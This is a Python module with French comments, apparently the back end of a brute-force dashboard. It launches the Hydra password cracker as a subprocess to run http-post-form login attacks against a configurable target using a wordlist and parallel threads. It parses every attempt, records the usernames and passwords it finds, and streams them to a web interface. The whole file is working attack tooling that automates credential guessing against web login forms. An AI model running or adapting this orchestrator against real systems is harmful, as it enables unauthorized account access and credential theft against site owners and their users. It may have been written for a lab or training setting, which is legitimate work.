# hydra_engine.py
# Moteur d'orchestration Hydra avec parsing temps réel
# Lance Hydra en sous-processus et alimente une ResultQueue partagée avec l'API SSE

import subprocess
import threading
import queue
import re
import time
import os
import logging
from dataclasses import dataclass, asdict, field
from datetime import datetime
from typing import Optional

# ─── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [HYDRA-ENGINE] %(levelname)s – %(message)s"
)
logger = logging.getLogger(__name__)

# ─── Structures de données ────────────────────────────────────────────────────

@dataclass
class AttemptResult:
    """Représente une tentative de connexion parsée depuis la sortie Hydra."""
    timestamp:  str
    username:   str
    password:   str
    success:    bool
    thread_id:  int = 0
    raw_line:   str = ""


@dataclass
class SessionStats:
    """Statistiques en temps réel d'une session d'attaque."""
    total:       int   = 0
    success:     int   = 0
    failed:      int   = 0
    start_time:  Optional[float] = None
    end_time:    Optional[float] = None
    active:      bool  = False
    found_creds: list  = field(default_factory=list)

    @property
    def elapsed(self) -> float:
        if not self.start_time:
            return 0.0
        end = self.end_time or time.time()
        return round(end - self.start_time, 1)

    @property
    def rate(self) -> float:
        if self.elapsed == 0:
            return 0.0
        return round(self.total / self.elapsed, 2)

    def to_dict(self) -> dict:
        return {
            "total":       self.total,
            "success":     self.success,
            "failed":      self.failed,
            "elapsed":     self.elapsed,
            "rate":        self.rate,
            "active":      self.active,
            "found_creds": self.found_creds,
        }


# ─── État global (partagé avec app.py) ────────────────────────────────────────
result_queue:   queue.Queue    = queue.Queue(maxsize=10000)
session_stats:  SessionStats   = SessionStats()
attack_process: Optional[subprocess.Popen] = None
stop_event:     threading.Event = threading.Event()
_lock:          threading.Lock  = threading.Lock()


# ─── Parseur de sortie Hydra ──────────────────────────────────────────────────

def parse_hydra_line(line: str) -> Optional[AttemptResult]:
    """
    Parse une ligne de sortie verbose de Hydra.

    Formats reconnus :
      Succès  : [PORT][http-post-form] host: X  login: USER  password: PASS
      Tentative: [ATTEMPT] target X - login "USER" - pass "PASS" - N of M [...]
      Résumé  : [STATUS] X of Y completed, ...
    """
    line = line.strip()
    if not line:
        return None

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ── Ligne de SUCCÈS ───────────────────────────────────────
    # Exemple : [8080][http-post-form] host: 127.0.0.1   login: admin   password: admin123
    pattern_success = re.compile(
        r'\[\d+\]\[http-post-form\].*\blogin:\s+(\S+)\s+password:\s+(.+)$'
    )
    m = pattern_success.search(line)
    if m:
        return AttemptResult(
            timestamp=ts,
            username=m.group(1),
            password=m.group(2).strip(),
            success=True,
            raw_line=line
        )

    # ── Ligne de TENTATIVE (mode -V verbose) ──────────────────
    # Exemple : [ATTEMPT] target 127.0.0.1 - login "admin" - pass "123456" - 1 of 1000 [child 0] (0/0)
    pattern_attempt = re.compile(
        r'\[ATTEMPT\]\s+target\s+\S+\s+-\s+login\s+"([^"]+)"\s+-\s+pass\s+"([^"]+)"'
        r'(?:\s+-\s+(\d+)\s+of\s+\d+)?(?:\s+\[child\s+(\d+)\])?'
    )
    m = pattern_attempt.search(line)
    if m:
        return AttemptResult(
            timestamp=ts,
            username=m.group(1),
            password=m.group(2),
            success=False,
            thread_id=int(m.group(4)) if m.group(4) else 0,
            raw_line=line
        )

    return None


# ─── Exécution Hydra ──────────────────────────────────────────────────────────

def _run_hydra_process(config: dict) -> None:
    """
    Fonction interne lancée dans un thread.
    Exécute Hydra et traite sa sortie ligne par ligne.
    """
    global attack_process, session_stats

    target_ip    = config.get("target_ip", os.getenv("TARGET_HOST", "target"))
    port         = int(config.get("port", 8080))
    login_url    = config.get("login_url", "/login")
    username     = config.get("username", "admin")
    wordlist     = config.get("wordlist_path", "/app/wordlists/common.txt")
    fail_string  = config.get("fail_string", "Invalid credentials")
    threads      = int(config.get("threads", 4))
    output_file  = "/tmp/hydra_results_{}.txt".format(int(time.time()))

    # Construction de la commande Hydra
    http_form_arg = "{}:username=^USER^&password=^PASS^:1=:F={}".format(
        login_url, fail_string
    )
    cmd = [
        "hydra",
        "-l", username,
        "-P", wordlist,
        target_ip,
        "-s", str(port),
        "http-post-form",
        http_form_arg,
        "-V",                   # verbose : affiche chaque tentative
        "-t", str(threads),     # threads parallèles
        "-f",                   # stopper quand un mot de passe valide est trouve
        "-o", output_file,      # fichier de résultats
        "-I",                   # ignorer les sessions précédentes
    ]

    logger.info("Lancement Hydra : %s", " ".join(cmd))

    try:
        attack_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,          # line-buffered
            universal_newlines=True
        )

        # Lire stdout ligne par ligne en temps réel
        for line in attack_process.stdout:
            if stop_event.is_set():
                logger.info("Stop demandé – arrêt du processus Hydra.")
                attack_process.terminate()
                break

            result = parse_hydra_line(line)
            if result:
                with _lock:
                    session_stats.total += 1
                    if result.success:
                        session_stats.success += 1
                        session_stats.found_creds.append({
                            "username": result.username,
                            "password": result.password,
                            "timestamp": result.timestamp
                        })
                    else:
                        session_stats.failed += 1

                # Mettre en file sans bloquer
                try:
                    result_queue.put_nowait(asdict(result))
                except queue.Full:
                    logger.warning("ResultQueue pleine – ligne ignorée.")

        attack_process.wait()
        rc = attack_process.returncode
        logger.info("Hydra terminé (code retour : %d).", rc)

    except FileNotFoundError:
        error_msg = {
            "error": True,
            "message": "Hydra introuvable. Vérifiez qu'il est installé : sudo apt install hydra",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        result_queue.put_nowait(error_msg)
        logger.error("Hydra non trouvé sur le système.")

    except Exception as e:
        error_msg = {
            "error": True,
            "message": "Erreur Hydra : {}".format(e),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        try:
            result_queue.put_nowait(error_msg)
        except queue.Full:
            logger.warning("ResultQueue pleine - erreur non envoyee au dashboard.")
        logger.exception("Erreur inattendue dans le thread Hydra : %s", e)

    finally:
        attack_process = None
        with _lock:
            session_stats.active   = False
            session_stats.end_time = time.time()
        logger.info("Session terminée – stats : %s", session_stats.to_dict())


# ─── API publique du module ────────────────────────────────────────────────────

def start_attack(config: dict) -> threading.Thread:
    """
    Démarre une nouvelle session d'attaque dans un thread daemon.

    Args:
        config: dict avec clés target_ip, port, login_url, username,
                wordlist_path, fail_string, threads

    Returns:
        Le thread lancé.
    """
    global session_stats

    # Réinitialiser l'état
    stop_event.clear()
    with _lock:
        session_stats = SessionStats(
            start_time=time.time(),
            active=True
        )
    # Vider la queue des résultats précédents
    while not result_queue.empty():
        try:
            result_queue.get_nowait()
        except queue.Empty:
            break

    t = threading.Thread(
        target=_run_hydra_process,
        args=(config,),
        daemon=True,
        name="HydraWorker"
    )
    t.start()
    logger.info("Thread Hydra démarré (config: %s)", config)
    return t


def stop_attack() -> None:
    """Arrête la session en cours de manière propre."""
    global attack_process
    stop_event.set()
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        try:
            attack_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            attack_process.kill()
        logger.info("Processus Hydra terminé.")
    with _lock:
        session_stats.active   = False
        session_stats.end_time = time.time()


def get_stats() -> dict:
    """Retourne les statistiques de la session courante (thread-safe)."""
    with _lock:
        return session_stats.to_dict()


def is_running() -> bool:
    """Retourne True si une attaque est en cours."""
    with _lock:
        return session_stats.active
